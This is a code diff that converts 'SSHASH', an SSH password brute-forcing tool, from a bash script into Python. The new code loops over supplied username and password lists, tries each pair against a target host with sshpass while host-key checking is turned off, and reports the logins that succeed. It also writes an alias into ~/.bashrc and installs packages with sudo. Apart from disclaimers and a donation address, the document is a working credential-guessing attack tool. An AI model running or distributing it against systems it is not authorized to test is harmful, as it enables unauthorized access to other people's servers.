@@ -1,184 +1,227 @@
-#!/bin/bash
+ ##################################################################
+ # WARNING: This Tool Is Made For Pentesters And Ethical Purposes #
+ ##################################################################
 
-# Developed by: Trabbit
-# V2.0
-# github.com/RAPS-LAUNCHER/SSHASH
-#
-#
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ----------------------------------------
+# Youtube: TrabbitOne
+# BuyMeACoffee: trabbit0ne
+# Bitcoin: bc1qehnsx5tdwkulamttzla96dmv82ty9ak8l5yy40
+# ----------------------------------------
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# ----------------------------------------
+# SSH Brute Forcing Software
+# Author: Trabbit
+# Date: 2024-07-18
+# ----------------------------------------
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#!/usr/bin/env python3
+
+import os
+import sys
+import time
+import signal
+import shutil
+import subprocess
+from argparse import ArgumentParser
+
+# Clear function
+def clear_screen():
+    os.system("clear")
 
 # Configurations
-alias_to_add='alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
+alias_to_add = 'alias sshash="cd && cd SSHASH && chmod +x * && ./sshash"'
+bashrc_path = os.path.expanduser("~/.bashrc")
 
-if ! grep -qxF "$alias_to_add" ~/.bashrc; then
-    echo "$alias_to_add" >> ~/.bashrc
-    clear
-    source ~/.bashrc
-    echo "Alias ajouté à ~/.bashrc"
-    sleep 0.5
-    clear
-fi
+def add_alias_to_bashrc():
+    with open(bashrc_path, 'r') as file:
+        if alias_to_add not in file.read():
+            with open(bashrc_path, 'a') as bashrc_file:
+                bashrc_file.write(f"\n{alias_to_add}\n")
+            subprocess.run(["source", bashrc_path], shell=True)
+            print("Alias added to ~/.bashrc")
+            time.sleep(0.5)
+            os.system('clear')
 
-version="V2.0"
+def install_package(package_name):
+    if package_name == "dnsutils":
+        if sys.platform == "darwin":
+            subprocess.run(["brew", "install", "bind"], check=True)
+        elif sys.platform == "linux":
+            subprocess.run(["sudo", "apt-get", "install", "-y", package_name], check=True)
+        elif "android" in os.uname().release.lower():
+            subprocess.run(["pkg", "install", package_name], check=True)
+        else:
+            print("System not supported!")
+            sys.exit(1)
+    elif package_name == "sshpass":
+        if sys.platform == "darwin":
+            subprocess.run(["brew", "install", package_name], check=True)
+        elif sys.platform == "linux":
+            subprocess.run(["sudo", "apt-get", "install", "-y", package_name], check=True)
+        elif "android" in os.uname().release.lower():
+            subprocess.run(["pkg", "install", package_name], check=True)
+        else:
+            print("System not supported!")
+            sys.exit(1)
 
-# Installations
-if ! command -v nslookup &>/dev/null; then
-    echo "[i] Installing nslookup..."
-if [[ "$(uname -o 2>/dev/null)" == "Android" ]]; then
-    pkg update
-        pkg install dnsutils
-    elif [ "$(uname)" == "Linux" ]; then
-        sudo apt-get update
-        sudo apt-get install -y dnsutils
-    elif [ "$(uname)" == "Darwin" ]; then
-        if ! command -v brew &>/dev/null; then
-            echo "Homebrew not found. Please install Homebrew first."
-            exit 1
-        fi
-        brew install bind
-    else
-        echo "System not supported!"
-        exit 1
-    fi
-fi
+def check_installations():
+    if not shutil.which("nslookup"):
+        print("[i] Installing nslookup...")
+        install_package("dnsutils")
+    if not shutil.which("sshpass"):
+        print("[i] Installing sshpass...")
+        install_package("sshpass")
 
+def signal_handler(sig, frame):
+    print("\nOperation aborted by the user.")
+    sys.exit(0)
 
-clear
-trap 'echo -e "\nOperation aborted by the user."; exit' INT
+def test_ssh_password(username, password, port, host):
+    ssh_command = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {username}@{host} 'exit'"
+    result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True)
+    if result.returncode == 0:
+        print(f"SSH Login Successful - {username}:{password} [\033[42mSUCCESS\033[0m]")
+    else:
+        print(f"SSH Login Failed - {username}:{password} [\033[41mFAIL\033[0m]")
 
-function test_ssh_password {
-    ssh_command="sshpass -p '$2' ssh -o StrictHostKeyChecking=no -p $3 $1@$4 'echo SSH Login Successful'"
-    if output=$(eval "$ssh_command" 2>&1); then
-        if [[ $output == *"SSH Login Successful"* ]]; then
-            echo -e "SSH Login Successful - $1:$2 [\e[42mSUCCESS\e[0m]"
-        else
-            echo -e "SSH Login Failed - $1:$2 [\e[41mFAIL\e[0m]"
-        fi
-    else
-        echo -e "SSH Login Failed - $1:$2 [\e[41mFAIL\e[0m]"
-    fi
-}
+def display_banner():
+    print("""
+                               ›—zÇGÅggÞ66Þí                  
+                             zÏgÅgggÞ6Ï{›{ügÇ—                
+                            zggÅÅÅÅÅÇüGGÇÏízüg{               
+                            {ÅÅÅÅÅÅÅÅgggGGg6ÞÅGz›             
+                            zÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÇüÞ—              
+                            ›ÅÅÅÅÅÅÅÅÅÅÅÅÅü{ÞÇÇ               
+                             ÞÅÅÅÅÅÅÅÅÅÅÅÅí›ÞÅÏ               
+                            ÏÅÅÅÅÅÅÅÅÅÅÅÅÅÅÞÏÞÏ{              
+                            ÏÅÅÅÅÅÅÅÅÅ6ÅÅgÏ›—üG{              
+                             ÇÅÅÅÅÅÅÅg{ÏÅÅÅÇígÏ               
+                              {GÅÅÅÅÅÅÞ6ÅÅÅ6{›                
+                              {GÅÅÅÅÅÅÇ{Gí—Þ{›                
+                            —ÇÅÅÅÅÅÅÅÅÅggü›zÇgü›              
+                          ›üÅÅggÅÅÅÅÅÅÅgz—gü6ÅÅgz             
+                        ›ÏgÅÅÅÇígÅÅÅÅgGGGÅÅÏ—gÅÅÅGí           
+                       zÅÅÅÅÅÅü  ügÅÅÅÅÅÅgz  GÅÅÅÅÅÅ—         
+                     í6GÅÅÅÅÅÅÇ›   {6gGü—   ›gÅÅÅÅÅÅGü—       
+                  —GÅÅÅÅÅÅÅÅÅÅgí  zgÅÅÅÅG{  üÅÅÅÅÅÅÅÅÅÅÅ6›    
+                 ›zÞÅÅÅÅÅÅÅÅÅÅÅgÏÞízgÅÅgízG6ÅÅÅÅÅÅÅÅÅÅÅÅÇí    
+                     {GÅÅÅÅÅÅÅÅÅÅ—  üÅgz  {ÅÅÅÅÅÅÅÅÅÅÇ—       
+                        íÇgÅÅÅÅÅÅgí›ÅgGÇ›ÏÅÅÅÅÅÅÅg6—          
+                           —6ÅÅÅÅÅÅgÅÅÅÅgÅÅÅÅÅgÏ›             
+                              —ügÅÅÅÅÅÅÅÅÅÅGÏ›                
+                                 —ÏgÅÅÅÅGýz›                  
+                                   ›zíiúiÿ<                   
 
-if [[ -z $ssh_port ]]; then
-    ssh_port=22
-fi
+                             DEVELOPED BY TRABBIT          
+                          __. __..  ..__. __..  .  
+                         (__ (__ |__|[__](__ |__|  
+                         .__).__)|  ||  |.__)|  |  
 
-# Parse command-line arguments
-while getopts ":u:t:p:l:" opt; do
-    case $opt in
-        u) userlist_path=$OPTARG ;;
-        t) host_ip_or_url=$OPTARG ;;
-        p) ssh_port=$OPTARG ;;
-        l) passwordlist_path=$OPTARG ;;
-        \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
-    esac
-done
+                    * SSHASH CONNECTION BRUTE FORCER *   
+           {>===============================================<}
+    """)
 
-if [[ -z $userlist_path ]]; then
-    echo "   __. __..  ..__. __..  .  "
-    echo "  (__ (__ |__|[__](__ |__|  "
-    echo "  .__).__)|  ||  |.__)|  |  "
-    echo "  ------------------------  "
-    echo -e "  \e[41mSSH CONNEXION BRUTEFORCER \e[0m"
-    echo
-    echo " |R.C.S.A.| RAPS CYBER SECURITY AGENCY.            "
-    echo "  WARNING: DO NOT USE FOR ILLEGAL/UNETHICAL PURPOSES. "
-    echo
-    echo
-    echo "Usage: sshash -u <user_file> -t <target> -p <port> -l <password_file> "
-    echo
-    echo
-    echo "Options: "
-    echo " -u users_file "
-    echo " -t target <ip or url> "
-    echo " -p port "
-    echo " -l password_list "
-    echo
-    echo "Exemples: "
-    echo " sshash -u usernames.txt -t https://exemple.com -p 22 -l passwords.txt   "
-    echo " sshash -u usernames.txt -t 192.168.123.32 -p 80 -l passwords.txt        "
-    echo " sshash -u users.txt -t https://exemple.com -l passwords.txt             "
-    echo
-    echo
-    exit 1
+def display_usage():
+    print("""
+   __. __..  ..__. __..  .  
+  (__ (__ |__|[__](__ |__|  
+  .__).__)|  ||  |.__)|  |  
+  ------------------------  
+  \033[41mSSH CONNECTION BRUTEFORCER \033[0m
 
-elif [[ -z $host_ip_or_url ]]; then
-        clear
-        echo "Please provide a target -t <URL or IP>. "
-        exit 0
-elif [[ -z $passwordlist_path ]]; then
-        clear
-        echo "Please provide a password file -l."
-        exit 0
-else
+ |R.C.S.A.| RAPS CYBER SECURITY AGENCY.
+  WARNING: DO NOT USE FOR ILLEGAL/UNETHICAL PURPOSES.
 
-IFS=$'\r\n' GLOBIGNORE='*' command eval 'users=($(cat "$userlist_path"))'
-IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$passwordlist_path"))'
+Usage: sshash -u <user_file> -t <target> -p <port> -l <password_file>
 
-echo "                                                              "
-echo "                               ›—zÇGÅggÞ66Þí                  "
-echo "                             zÏgÅgggÞ6Ï{›{ügÇ—                "
-echo "                            zggÅÅÅÅÅÇüGGÇÏízüg{               "
-echo "                            {ÅÅÅÅÅÅÅÅgggGGg6ÞÅGz›             "
-echo "                            zÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÇüÞ—              "
-echo "                            ›ÅÅÅÅÅÅÅÅÅÅÅÅÅü{ÞÇÇ               "
-echo "                             ÞÅÅÅÅÅÅÅÅÅÅÅÅí›ÞÅÏ               "
-echo "                            ÏÅÅÅÅÅÅÅÅÅÅÅÅÅÅÞÏÞÏ{              "
-echo "                            ÏÅÅÅÅÅÅÅÅÅ6ÅÅgÏ›—üG{              "
-echo "                             ÇÅÅÅÅÅÅÅg{ÏÅÅÅÇígÏ               "
-echo "                              {GÅÅÅÅÅÅÞ6ÅÅÅ6{›                "
-echo "                              {GÅÅÅÅÅÅÇ{Gí—Þ{›                "
-echo "                            —ÇÅÅÅÅÅÅÅÅÅggü›zÇgü›              "
-echo "                          ›üÅÅggÅÅÅÅÅÅÅgz—gü6ÅÅgz             "
-echo "                        ›ÏgÅÅÅÇígÅÅÅÅgGGGÅÅÏ—gÅÅÅGí           "
-echo "                       zÅÅÅÅÅÅü  ügÅÅÅÅÅÅgz  GÅÅÅÅÅÅ—         "
-echo "                     í6GÅÅÅÅÅÅÇ›   {6gGü—   ›gÅÅÅÅÅÅGü—       "
-echo "                  —GÅÅÅÅÅÅÅÅÅÅgí  zgÅÅÅÅG{  üÅÅÅÅÅÅÅÅÅÅÅ6›    "
-echo "                 ›zÞÅÅÅÅÅÅÅÅÅÅÅgÏÞízgÅÅgízG6ÅÅÅÅÅÅÅÅÅÅÅÅÇí    "
-echo "                     {GÅÅÅÅÅÅÅÅÅÅ—  üÅgz  {ÅÅÅÅÅÅÅÅÅÅÇ—       "
-echo "                        íÇgÅÅÅÅÅÅgí›ÅgGÇ›ÏÅÅÅÅÅÅÅg6—          "
-echo "                           —6ÅÅÅÅÅÅgÅÅÅÅgÅÅÅÅÅgÏ›             "
-echo "                              —ügÅÅÅÅÅÅÅÅÅÅGÏ›                "
-echo "                                 —ÏgÅÅÅÅGýz›                  "
-echo "                                   ›zíiúiÿ<                   "
-echo
-echo -e "\e[0m                             DEVELOPED BY \e[35mTRABBIT          \e[0m"
-echo
+Options:
+ -u users_file
+ -t target <ip or url>
+ -p port
+ -l password_list
 
+Examples:
+ sshash -u usernames.txt -t https://example.com -p 22 -l passwords.txt
+ sshash -u usernames.txt -t 192.168.123.32 -p 80 -l passwords.txt
+ sshash -u users.txt -t https://example.com -l passwords.txt
+""")
 
+class CustomArgumentParser(ArgumentParser):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.register('action', 'help', CustomHelpAction)
 
-echo "                          __. __..  ..__. __..  .  "
-echo "                         (__ (__ |__|[__](__ |__|  "
-echo "                         .__).__)|  ||  |.__)|  |  "
-echo
-echo "                    * SSHASH CONNECTION BRUTE FORCER *   "
-echo "           {>===============================================<}"
+    def error(self, message):
+        display_usage()
+        self.exit(2)
 
-# Display target, port, and passlist filenames, including IP or URL
-for i in "           --{[+]TARGET} => $host_ip_or_url" "           --{[+]PORT} => ${ssh_port:-22}" "           --{[+]USERLIST} => $(basename "$userlist_path")" "           --{[+]PASSLIST} => $(basename "$passwordlist_path")"; do
-    sleep 0.1
-    echo "$i"
-done
-sleep 0.1
-echo "           {>===============================================<}"
-echo "                      //BRUTEFORCE ATTACK STARTED//     "
-echo "           {>===============================================<}"
-echo -n "            "
-for i in {1..49}; do
-    sleep 0.001
-    echo -n "*"
-done
-echo
+class CustomHelpAction:
+    def __init__(self, option_strings, dest, nargs=0, **kwargs):
+        self.option_strings = option_strings
+        self.dest = dest
+        self.nargs = nargs
 
-for user in "${users[@]}"; do
-    for password in "${passwords[@]}"; do
-        echo -n "            "
-        test_ssh_password "$user" "$password" "$ssh_port" "$host_ip"
-    done
-done
-echo "           {>===============================================<}"
-echo "                                   Done.                 "
-echo "           {>===============================================<}"
-echo
-echo
+    def __call__(self, parser, namespace, values, option_string=None):
+        display_usage()
+        parser.exit()
 
-fi
+def main():
+    clear_screen()
+    parser = CustomArgumentParser(add_help=False)
+    parser.add_argument('-h', '--help', action='store_true', help='Show this help message and exit')
+    parser.add_argument("-u", "--users", required=True, help="Path to the file containing the list of usernames")
+    parser.add_argument("-t", "--target", required=True, help="Target IP or URL")
+    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
+    parser.add_argument("-l", "--passwords", required=True, help="Path to the file containing the list of passwords")
+    args = parser.parse_args()
+
+    if args.help:
+        display_usage()
+        sys.exit(0)
+
+    # Add alias to bashrc if not present
+    add_alias_to_bashrc()
+
+    # Check and install necessary packages
+    check_installations()
+
+    # Display banner
+    display_banner()
+
+    # Load user and password lists
+    with open(args.users, 'r') as user_file:
+        users = [line.strip() for line in user_file.readlines()]
+
+    with open(args.passwords, 'r') as password_file:
+        passwords = [line.strip() for line in password_file.readlines()]
+
+    # Start brute force attack
+    print(f"           --{{[+]TARGET}} =>", args.target)
+    print(f"           --{{[+]PORT}} =>", args.port)
+    print(f"           --{{[+]USERLIST}} => {os.path.basename(args.users)}")
+    print(f"           --{{[+]PASSLIST}} => {os.path.basename(args.passwords)}")
+    print()
+    print("           {>===============================================<}")
+    print("                      //BRUTEFORCE ATTACK STARTED//     ")
+    print("           {>===============================================<}")
+    print("            ", end="")
+    for _ in range(49):
+        time.sleep(0.01)
+        print("*", end="")
+    print()
+
+    for user in users:
+        for password in passwords:
+            print("            ", end="")
+            test_ssh_password(user, password, args.port, args.target)
+
+    print("           {>===============================================<}")
+    print("                                   Done.                 ")
+    print("           {>===============================================<}")
+    print()
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, signal_handler)
+    main()
